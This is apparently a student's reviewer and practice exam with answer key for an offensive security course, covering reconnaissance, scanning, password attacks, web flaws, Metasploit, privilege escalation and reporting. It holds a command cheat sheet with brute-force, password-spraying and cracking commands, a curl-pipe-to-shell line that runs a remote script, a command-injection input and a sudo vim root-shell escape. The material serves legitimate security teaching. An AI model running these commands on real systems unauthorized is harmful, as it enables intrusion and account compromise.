---
id: nssecu2_comprehensive_reviewer_and_practice_exam
type: reviewer
course: NSSECU2
topic: "NSSECU2 Comprehensive Reviewer and Practice Exam"
status: completed
---

# NSSECU2 Comprehensive Reviewer and Practice Exam

> [!info] Document Metadata
> - **Course:** `=this.course`
> - **Topic:** `=this.topic`
> - **Status:** `=this.status`

**🏷️ Tags:** #[[Computer Science]] #[[NSSECU2]] #[[Cybersecurity]] #[[Reviewer]] #[[Exam Practice]] #[[VAPT]] #[[Offensive Security]] #[[Penetration Testing]]

---

## Overview

> This comprehensive study reviewer and practice examination synthesizes the entire curriculum of **NSSECU2 (Advanced and Offensive Security)** across all 11 instructional modules. Spanning foundational offensive security principles, passive OSINT and active reconnaissance, network scanning dynamics, deep service enumeration, CVSS v3.1 mathematical scoring, attack path modeling, authentication and password cracking, web application pentesting with Burp Suite, controlled Metasploit exploitation, post-exploitation and privilege escalation, and enterprise VAPT reporting, this guide prepares students and security practitioners for rigorous academic examinations and industry-standard technical certifications.

## High-Yield Concept Summaries

### 1. Penetration Testing Frameworks & Methodologies (Module 1)

| Framework | Sponsoring Body | Key Characteristics & Stages |
| :--- | :--- | :--- |
| **PTES** | Industry Consortium | 7 Stages: Pre-engagement, Intelligence Gathering, Threat Modeling, Vulnerability Analysis, Exploitation, Post-Exploitation, Reporting. |
| **OSSTMM 3** | ISECOM | Quantifiable operational security metrics, Trust Analysis, Human, Physical, and Wireless vectors. |
| **NIST SP 800-115**| NIST (Federal) | Technical Guide to InfoSec Testing: Planning, Discovery, Attack, Reporting. |
| **OWASP WSTG** | OWASP | Web Security Testing Guide (v4.2): 12 testing categories covering all web and API layers. |

### 2. Reconnaissance & OSINT Matrix (Module 2)

| Tool / Technique | Category | Primary Function & Syntax |
| :--- | :--- | :--- |
| **Google Dorking** | Passive OSINT | `site:target.com filetype:sql \| filetype:env` (Find exposed configs/backups). |
| **Certificate Transparency** | Passive OSINT | Query `crt.sh/?q=%.target.com` to uncover active and historical subdomains. |
| **Shodan / Censys** | Passive IoT / OSINT | `hostname:"target.com" org:"Target Org"` (Find exposed origin IPs and ports). |
| **`dnsrecon`** | Active DNS | `dnsrecon -d target.com -t axfr` (Check DNS zone transfers, records, brute-force). |
| **`whatweb`** | Active Web Profiling | `whatweb -v -a 3 http://target.com` (Detect CMS, framework, web server versions). |
| **`theHarvester`** | Passive/Active OSINT | `theHarvester -d target.com -b all` (Harvest corporate emails and employee names). |
| **`sherlock`** | Passive SOCMINT | `sherlock username` (Scan 300+ platforms for matching social aliases). |

### 3. Network Scanning & Packet Dynamics (Module 3)

| Scan Flag | Name | Handshake Mechanics | Privileges | Firewall Interaction |
| :--- | :--- | :--- | :--- | :--- |
| **`-sS`** | TCP SYN Stealth | Sends `SYN` $\rightarrow$ Gets `SYN/ACK` $\rightarrow$ Sends `RST` | Root (Raw Socket) | Fast, rarely logged by app layer. |
| **`-sT`** | TCP Connect | Completes full 3-way handshake (`SYN` $\rightarrow$ `SYN/ACK` $\rightarrow$ `ACK`) | Any standard user | Logged in app access logs. |
| **`-sU`** | UDP Scan | Probes connectionless UDP; awaits data or ICMP Type 3 Code 3 | Root (Raw Socket) | Subject to OS ICMP rate limiting. |
| **`-sn`** | Ping Sweep | Host discovery only; disables port scan | Standard / Root | Fast subnet mapping. |
| **`-sV -O`** | Version & OS | Probes open ports for banners; analyzes TCP/IP fingerprint | Root for OS stack | Identifies exact software and OS build. |

### 4. Enumeration & Content Discovery (Module 4)

| Technique / Tool | Target Protocol | Syntax Example | Offensive Utility |
| :--- | :--- | :--- | :--- |
| **Netcat Banner Grab** | Raw TCP Sockets | `nc -vn 192.168.1.10 21` | Captures raw daemon welcome banners. |
| **cURL Header Inspect** | HTTP / HTTPS | `curl -I -s http://target.com` | Extracts `Server`, `X-Powered-By`, cookie flags. |
| **Gobuster** | HTTP Web Routes | `gobuster dir -u <url> -w common.txt -x php,txt` | Uncovers hidden admin portals and backups. |
| **FFUF** | Web Parameters/APIs | `ffuf -u <url>/FUZZ -w dict.txt -mc 200,301,403` | Fast fuzzing with status and byte filtering. |
| **`smbclient`** | Windows SMB | `smbclient -L //target/ -N` | Discovers open shares via null/anonymous sessions. |
| **`enum4linux-ng`** | Windows / Samba | `enum4linux-ng -A target` | Complete automated user, share, and group enum. |

### 5. CVSS v3.1 Metric Multipliers & Formulas (Module 5)

$$\text{Base Score Formula} = f(\text{Exploitability Sub-Score}, \text{Impact Sub-Score}, \text{Scope})$$

- **Exploitability Metrics:**
  - **Attack Vector (AV):** Network ($0.85$), Adjacent ($0.62$), Local ($0.55$), Physical ($0.20$)
  - **Attack Complexity (AC):** Low ($0.77$), High ($0.44$)
  - **Privileges Required (PR):** None ($0.85$), Low ($0.62$ / $0.68$), High ($0.27$ / $0.50$)
  - **User Interaction (UI):** None ($0.85$), Required ($0.62$)
- **Scope (S):** Unchanged (`U`), Changed (`C`)
- **Impact Metrics:** Confidentiality ($C$), Integrity ($I$), Availability ($A$) $\in \{0.00 \text{ (None)}, 0.22 \text{ (Low)}, 0.56 \text{ (High)}\}$
- **Severity Tiers:** None ($0.0$), Low ($0.1 - 3.9$), Medium ($4.0 - 6.9$), High ($7.0 - 8.9$), Critical ($9.0 - 10.0$)

### 6. Authentication Attacks & Password Cracking (Module 7)

| Attack Type | Mechanics & Tools | Key Defense |
| :--- | :--- | :--- |
| **Password Spraying** | Testing 1 common password across 1,000 accounts (`crackmapexec`, `hydra`). | Multi-Factor Authentication (MFA), anomaly detection. |
| **Online Brute-Force** | Rapidly testing thousands of passwords on 1 account (`hydra -l user -P dict`). | Progressive lockout delays, CAPTCHA, rate limits. |
| **Username Enumeration** | Analyzing error message differences, status codes, or execution time differences. | Generic error messages ("Invalid username or password"). |
| **Offline Hash Cracking** | GPU/CPU dictionary/rule attacks (`hashcat -m 1000 -a 0`, `john`). | Strong, memory-hard hashing (**Argon2id**, **bcrypt**). |
| **Custom Wordlist Gen** | Spidering target websites for company-specific terminology (`cewl -w list.txt`). | Enforcing password complexity and blocking common words. |

### 7. Web Vulnerability Testing (Module 8)

| Vulnerability | OWASP Category | Root Cause & Detection Method | Primary Remediation |
| :--- | :--- | :--- | :--- |
| **IDOR / BOLA** | Broken Access Control | Missing server-side authorization check on direct object IDs (`?id=102`). | Enforce context-aware server-side authorization checks. |
| **SQL Injection** | Injection | Concatenating untrusted user input directly into SQL strings. | Parameterized Queries / Prepared Statements (PDO, ORM). |
| **Reflected XSS** | Injection | Reflecting unencoded input from URL/GET directly into HTML DOM. | Contextual HTML/JavaScript output encoding, strict CSP. |
| **Stored XSS** | Injection | Saving unencoded user input into database and rendering to all viewers. | Input sanitization, output encoding, Content Security Policy. |
| **Command Injection**| Injection | Passing unfiltered parameters into system shell execution functions. | Avoid shell calls; use safe platform APIs with input whitelists. |

### 8. Metasploit & Shell Architectures (Module 9)

- **Bind Shell:** Compromised target listens on a port; tester initiates inbound connection (blocked by inbound firewalls).
- **Reverse Shell:** Compromised target initiates outbound connection to tester's listener (traverses NAT and egress firewalls).
- **Meterpreter:** Dynamic in-memory payload using Reflective DLL Injection (zero disk footprint, process migration, TLS encryption).
- **Console Workflow:** `search` $\rightarrow$ `use` $\rightarrow$ `set RHOSTS/LHOST` $\rightarrow$ `check` $\rightarrow$ `exploit` $\rightarrow$ `sessions -i <ID>`.

### 9. Privilege Escalation Vectors (Module 10)

- **Linux Vectors:** Sudo NOPASSWD misconfigurations (`sudo -l`), SUID root binaries (`find / -perm -4000`), writable cron jobs, plaintext credentials in web roots (`wp-config.php`), kernel exploits (Dirty COW).
- **Windows Vectors:** Unquoted service paths (`C:\Program Files\App\service.exe`), `SeImpersonatePrivilege` token abuse (SweetPotato/PrintSpoofer), AlwaysInstallElevated MSI installations, weak service permissions.
- **Automated Enumerators:** `LinPEAS` (Linux), `WinPEAS` (Windows).

### 10. VAPT Reporting Architecture (Module 11)

- **Executive Summary:** High-level risk posture, business impact, strategic roadmap for C-Suite without technical jargon.
- **Technical Findings (8-Point Anatomy):**
  1. Title & Unique ID
  2. Severity Rating & CVSS v3.1 Vector
  3. Classification (CVE / CWE)
  4. Affected Asset(s)
  5. Technical Description
  6. Proof of Concept (PoC Reproduction Steps)
  7. Impact Analysis
  8. Actionable Remediation Guidance

## Command & Syntax Quick Reference

```bash
# --- RECONNAISSANCE & OSINT ---
whois target.com
dnsrecon -d target.com -t axfr,std,brt
sublist3r -d target.com -b -o subdomains.txt
whatweb -v -a 3 http://target.com
theHarvester -d target.com -b all -l 500

# --- NETWORK SCANNING (NMAP) ---
nmap -sn 192.168.10.0/24 -oN hosts.txt                   # Host Discovery / Ping Sweep
nmap -sS -p- -T4 --min-rate 1000 192.168.10.45 -oN tcp.txt # Full TCP SYN Port Scan
nmap -sV -sC -O -p 22,80,443,8080 192.168.10.45 -oA deep # Service, Script & OS
nmap -sU -p 53,67,68,123,161,500 192.168.10.45 -oN udp.txt # Top UDP Scan

# --- ENUMERATION & FUZZING ---
gobuster dir -u http://192.168.10.45/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak
ffuf -u http://192.168.10.45/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302,403
smbclient -L //192.168.10.45/ -N
enum4linux-ng -A 192.168.10.45

# --- AUTHENTICATION & PASSWORD ATTACKS ---
cewl https://target.com -d 2 -m 6 -w custom_wordlist.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.10.45 ssh -t 4 -f
crackmapexec smb 192.168.10.0/24 -u users.txt -p "Pass2026!" --continue-on-success
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -O
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt

# --- EXPLOIT SEARCH & METASPLOIT ---
searchsploit "Apache 2.4.41"
searchsploit -m 42024.py
msfconsole -q
# Inside msfconsole:
# use <module> -> set RHOSTS <target> -> set PAYLOAD <payload> -> set LHOST <ip> -> check -> exploit

# --- PRIVILEGE ESCALATION ---
# Linux:
sudo -l
find / -perm -u=s -type f 2>/dev/null
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Windows:
whoami /priv
winPEASx64.exe quiet cmd fast
```

## 30-Question Comprehensive Practice Examination

1. What is the fundamental ethical and legal boundary separating White Hat penetration testers from Gray Hat and Black Hat actors?
    - **A)** The technical programming languages used during exploitation
    - **B)** Explicit, written authorization and a legally binding Rules of Engagement (RoE) contract
    - **C)** The brand of operating system installed on the tester's machine
    - **D)** Whether testing is performed during business hours or weekends

2. An organization requests an assessment simulating an attack by an external, opportunistic adversary who has zero prior knowledge of internal networks or software architecture. Which testing methodology must be used?
    - **A)** White-Box Testing
    - **B)** Gray-Box Testing
    - **C)** Black-Box Testing
    - **D)** Code Audit Testing

3. An analyst searches for `site:target.com intitle:"index of /" "backup"` on a public search engine. What reconnaissance technique is being utilized?
    - **A)** Active DNS Zone Transfer
    - **B)** Google Dorking (Passive OSINT)
    - **C)** SYN Stealth Scanning
    - **D)** Reverse Shell Injection

4. What critical intelligence does querying Certificate Transparency logs via `crt.sh` provide to a security tester?
    - **A)** Decrypted administrative passwords
    - **B)** Historical and active subdomains and staging environments associated with issued SSL/TLS certificates
    - **C)** Cleartext database schemas
    - **D)** Internal router BGP routing tables

5. Why does a standard TCP SYN scan (`-sS`) avoid generating log entries in most application-layer access logs?
    - **A)** Because it transmits packets over UDP instead of TCP.
    - **B)** Because it tears down the connection with a `RST` packet before the three-way handshake is completed, preventing the operating system from passing the connection to the application layer.
    - **C)** Because Nmap automatically deletes application log files via SSH.
    - **D)** Because the scan operates at Layer 1 (Physical).

6. An Nmap scan against a host returns `PORT 443/tcp open  ssl/http`. The analyst concludes that the host is running a vulnerable WordPress plugin without performing any further checks. What investigative mistake occurred?
    - **A)** Correct Threat Modeling
    - **B)** Premature Conclusion / Assumption without Protocol Enumeration
    - **C)** Validated Exploit Matching
    - **D)** Passive Reconnaissance

7. Why does full-range UDP port scanning (`-sU -p-`) take substantially longer than TCP scanning against a Linux host?
    - **A)** UDP packets are encrypted by default.
    - **B)** The Linux kernel strictly rate-limits the generation of ICMP Destination Unreachable (Port Unreachable) error responses.
    - **C)** Nmap cannot scan UDP ports above 1024.
    - **D)** UDP requires a six-way handshake.

8. When fuzzing a web application with `gobuster dir`, what is the purpose of the `-x` parameter (e.g., `-x php,txt,json`)?
    - **A)** To exclude those file types from the scan
    - **B)** To append the specified file extensions to each word in the dictionary to discover hidden script files
    - **C)** To automatically execute discovered scripts on the remote web server
    - **D)** To convert the scan into an offline hash cracking job

9. An HTTP request returns a status code of `401 Unauthorized`. What does this response indicate?
    - **A)** The requested web page was permanently deleted.
    - **B)** The requested resource requires valid authentication credentials that were either missing or invalid.
    - **C)** The server's hard drive crashed.
    - **D)** The user possesses administrative root privileges.

10. A tester discovers that an anonymous client can connect to an internal file server using `smbclient -L //10.0.0.5/ -N`. What vulnerability does this represent?
    - **A)** Unauthenticated / Anonymous SMB Share Enumeration
    - **B)** Remote Kernel Stack Overflow
    - **C)** Reflected Cross-Site Scripting
    - **D)** Denial of Service via SYN Flood

11. Under the CVSS v3.1 standard, what is the qualitative severity classification of a vulnerability assigned a Base Score of `9.8`?
    - **A)** Medium
    - **B)** High
    - **C)** Critical
    - **D)** Low

12. A vulnerability allows an unauthenticated remote attacker to read database credentials from an exposed configuration file, but provides no ability to modify data or cause denial of service. What are the Confidentiality, Integrity, and Availability impact metrics for this flaw?
    - **A)** Confidentiality: High (`H`), Integrity: None (`N`), Availability: None (`N`)
    - **B)** Confidentiality: None (`N`), Integrity: High (`H`), Availability: High (`H`)
    - **C)** Confidentiality: Low (`L`), Integrity: Low (`L`), Availability: Low (`L`)
    - **D)** Confidentiality: High (`H`), Integrity: High (`H`), Availability: High (`H`)

13. Why does an unauthenticated vulnerability scanner frequently produce False Positives when evaluating software banners on enterprise Linux distributions (e.g., Ubuntu, RHEL)?
    - **A)** Enterprise Linux distributions do not use IP addresses.
    - **B)** Enterprise Linux distributions frequently backport security fixes into older package version strings without changing the base upstream version number.
    - **C)** Automated scanners only work on Windows 98.
    - **D)** Banners are encrypted with AES-256.

14. Which CVSS v3.1 metric accounts for whether an attack requires tricking a human user into clicking a malicious link or opening an attachment?
    - **A)** Attack Vector (AV)
    - **B)** User Interaction (UI)
    - **C)** Attack Complexity (AC)
    - **D)** Scope (S)

15. What is the primary purpose of constructing an Attack Path correlation table during an assessment?
    - **A)** To satisfy a word count requirement in the final report
    - **B)** To systematically connect disparate reconnaissance and enumeration clues into a prioritized, verifiable chain of exploitation
    - **C)** To replace the need for writing Python scripts
    - **D)** To permanently disable the target's firewall

16. An analyst finds a public exploit on Exploit-DB for `Apache 2.4.49`. Before executing it, which condition in the 6-Point Exploit Matching Checklist verifies that the target's operating system and CPU architecture are compatible?
    - **A)** Exact Product Match
    - **B)** Version Vulnerability Range
    - **C)** OS and Architecture Compatibility
    - **D)** Non-Destructive Proof Verification

17. How does a Password Spraying attack differ fundamentally from a traditional Brute-Force attack?
    - **A)** Password spraying attempts thousands of passwords against one account, whereas brute force attempts one password on one account.
    - **B)** Password spraying tests a single common password across hundreds of different accounts horizontally to evade account lockout thresholds.
    - **C)** Password spraying only targets Linux SSH daemons.
    - **D)** Password spraying requires GPU hardware acceleration.

18. A web application displays the error `"User account alice exists, but password was incorrect."` when testing `alice`, and `"User account not found."` when testing `bob`. What vulnerability is present?
    - **A)** Username Enumeration
    - **B)** SQL Injection
    - **C)** Buffer Overflow
    - **D)** Session Hijacking

19. Which HTTP cookie security attribute prevents client-side JavaScript (such as injected XSS payloads) from accessing the session token via `document.cookie`?
    - **A)** `Secure`
    - **B)** `HttpOnly`
    - **C)** `SameSite=Lax`
    - **D)** `Domain`

20. An analyst captures an NTLM password hash during an assessment. Which Hashcat mode (`-m`) is used to crack NTLM hashes?
    - **A)** `-m 0` (MD5)
    - **B)** `-m 1000` (NTLM)
    - **C)** `-m 1800` (sha512crypt)
    - **D)** `-m 3200` (bcrypt)

21. In Burp Suite, which module is specifically designed to allow an analyst to manually modify an individual HTTP request, re-send it, and inspect the immediate response diffs?
    - **A)** Burp Repeater
    - **B)** Burp Spider
    - **C)** Burp Decoder
    - **D)** Burp Sequencer

22. A web application allows logged-in User 101 to access `GET /api/user/102/profile` and view User 102's private address and credit card details without an authorization check. What OWASP vulnerability does this represent?
    - **A)** Insecure Direct Object Reference (IDOR / Broken Object Level Authorization)
    - **B)** Cross-Site Scripting (XSS)
    - **C)** Server-Side Request Forgery (SSRF)
    - **D)** Broken Cryptography

23. Why are Parameterized Queries (Prepared Statements) considered the definitive defense against SQL Injection?
    - **A)** They encrypt the entire database hard drive.
    - **B)** They pre-compile the SQL query structure on the server and treat all user parameters strictly as literal data rather than executable SQL code.
    - **C)** They convert SQL queries into HTML format.
    - **D)** They disable all database user logins.

24. An application takes an input parameter `filename` and executes `cat /var/www/uploads/" . $_GET['filename']`. An attacker submits `test.txt | whoami`. What vulnerability is being exploited?
    - **A)** OS Command Injection
    - **B)** Cross-Site Request Forgery (CSRF)
    - **C)** Insecure Deserialization
    - **D)** XML External Entity (XXE)

25. Why are Reverse Shells significantly more effective than Bind Shells when attacking hosts situated behind network firewalls and NAT gateways?
    - **A)** Reverse shells require less CPU usage on the target.
    - **B)** Reverse shells establish outbound connections from the target back to the attacker's listener, bypassing perimeter firewalls that block unsolicited inbound connections.
    - **C)** Bind shells cannot execute bash scripts.
    - **D)** Reverse shells are legally approved without authorization.

26. What unique architectural feature of Meterpreter allows it to evade traditional disk-based antivirus detection?
    - **A)** It writes encrypted `.dll` files to `C:\Windows\Temp`.
    - **B)** It executes entirely in volatile system memory via Reflective DLL Injection without creating executable files on physical storage.
    - **C)** It reboots the system every 60 seconds.
    - **D)** It renames itself to `notepad.exe` on disk.

27. An analyst executes `sudo -l` on a compromised Linux host and discovers `(root) NOPASSWD: /usr/bin/vim`. How can the analyst immediately obtain an elevated root shell?
    - **A)** `:set number`
    - **B)** `:!/bin/sh` (or `:py3 import os; os.execl("/bin/sh", "sh")`) inside Vim
    - **C)** `:w root.txt`
    - **D)** `:q!`

28. On a Windows server, a service binary path is configured as `C:\Program Files\Enterprise App\service.exe` without enclosing quotation marks. What vulnerability does this represent?
    - **A)** Unquoted Service Path
    - **B)** SUID Binary Misconfiguration
    - **C)** Dirty COW Kernel Flaw
    - **D)** Memory Leak

29. What is the fundamental objective of the Executive Summary section of a VAPT report?
    - **A)** To list all 65,535 probed ports in raw hex format
    - **B)** To communicate overall organizational risk, business impact, and strategic remediation roadmaps to executive leadership in non-technical language
    - **C)** To provide source code for denial-of-service exploits
    - **D)** To track the hourly billable rate of the penetration testers

30. In the 8-Point Anatomy of a Vulnerability Finding, what is the primary role of the Proof of Concept (PoC) section?
    - **A)** To prove that the tester worked 40 hours during the assessment
    - **B)** To provide clear, repeatable, step-by-step technical instructions allowing engineers to independently reproduce and verify the vulnerability
    - **C)** To provide a generic marketing summary of cybersecurity trends
    - **D)** To permanently delete server access logs

---

## Detailed Answer Key & Explanations

1. **B**. The defining distinction is **explicit, written authorization** and adherence to a legally binding **Rules of Engagement (RoE)** contract. Operating without authorization violates criminal statutes regardless of intent.
2. **C**. **Black-Box Testing** simulates an external adversary starting with zero insider knowledge, forcing reliance on external reconnaissance.
3. **B**. **Google Dorking** leverages advanced search operators against public search indices to uncover exposed directories and backup files without sending direct packets to the target.
4. **B**. **Certificate Transparency (`crt.sh`)** logs provide a public ledger of all certificates issued by CAs, exposing historical, staging, and internal subdomains.
5. **B**. A **TCP SYN Scan (`-sS`)** transmits a `RST` packet upon receiving `SYN/ACK`, tearing down the connection before the three-way handshake completes, preventing the application layer from logging the transaction.
6. **B**. Concluding a vulnerability exists based strictly on a port number or banner without enumerating the underlying service constitutes a **premature assumption**.
7. **B**. The Linux kernel strictly enforces **ICMP rate limiting** (typically 1 ICMP Port Unreachable packet per second), throttling UDP scan responses.
8. **B**. The **`-x`** flag in `gobuster dir` appends specified file extensions (e.g., `.php`, `.txt`, `.json`) to each dictionary word to discover hidden files.
9. **B**. HTTP status code **`401 Unauthorized`** indicates that access requires valid authentication credentials that were either missing or invalid.
10. **A**. Connecting to SMB shares with `-N` (null session) demonstrates **Unauthenticated SMB Share Enumeration**, exposing internal shares and directory structures.
11. **C**. In the CVSS v3.1 qualitative severity rating scale, scores from **$9.0$ to $10.0$** are classified as **Critical**.
12. **A**. Complete unauthorized read access to secrets without modification or disruption equates to **Confidentiality: High (`H`)**, **Integrity: None (`N`)**, and **Availability: None (`N`)**.
13. **B**. Linux vendors **backport** security patches to existing package versions without incrementing upstream version numbers, causing superficial banner-checking scanners to report false positives.
14. **B**. **User Interaction (UI)** measures whether the attack requires action by a human victim (e.g., clicking a phishing link, visiting a page with Stored XSS).
15. **B**. An **Attack Path correlation table** systematically maps disparate clues from recon, scanning, and enumeration into an evidence-based chain of exploitation.
16. **C**. **OS and Architecture Compatibility** ensures the exploit's machine instructions, memory offsets, and system calls match the target's operating system and CPU bitness.
17. **B**. **Password Spraying** tests a single likely password across numerous accounts horizontally, remaining below per-account lockout thresholds.
18. **A**. Differential error messages that reveal whether an account exists in the database introduce **Username Enumeration**.
19. **B**. The **`HttpOnly`** cookie flag instructs browsers to block client-side JavaScript access (`document.cookie`), mitigating session hijacking via XSS.
20. **B**. In Hashcat, **Mode `1000`** is the dedicated hash mode for **NTLM** (Windows NT LAN Manager) hashes.
21. **A**. **Burp Repeater** is designed for manual, iterative HTTP request manipulation and comparative response analysis.
22. **A**. Accessing another user's private data by modifying a direct object reference parameter without authorization checks is an **Insecure Direct Object Reference (IDOR / BOLA)** flaw.
23. **B**. **Prepared Statements (Parameterized Queries)** compile query logic in advance, treating subsequent user inputs strictly as literal data variables that cannot alter query semantics.
24. **A**. Appending shell command delimiters (`;`, `|`, `&&`) to execute unauthorized operating system commands constitutes **OS Command Injection**.
25. **B**. Stateful perimeter firewalls almost universally block unsolicited inbound connections (preventing Bind Shells), but permit **outbound connections** initiated from inside the perimeter (enabling Reverse Shells).
26. **B**. **Meterpreter** resides solely in volatile system memory via **Reflective DLL Injection**, never writing executable binaries to physical disk storage.
27. **B**. In `vim`, executing **`:!/bin/sh`** or using internal scripting spawns a shell that inherits the elevated root privileges granted by the sudoers rule.
28. **A**. An **Unquoted Service Path** containing spaces causes Windows to attempt executing binary prefixes (e.g., `C:\Program.exe`) before the intended executable.
29. **B**. The **Executive Summary** translates technical vulnerabilities into **business risk, financial exposure, and strategic roadmaps** for non-technical leadership.
30. **B**. A **Proof of Concept (PoC)** provides **reproducible, unambiguous reproduction steps** allowing technical teams to verify the vulnerability and validate remediations.


## References & Navigation

- **Related Notes:** [[Network Security 2]]
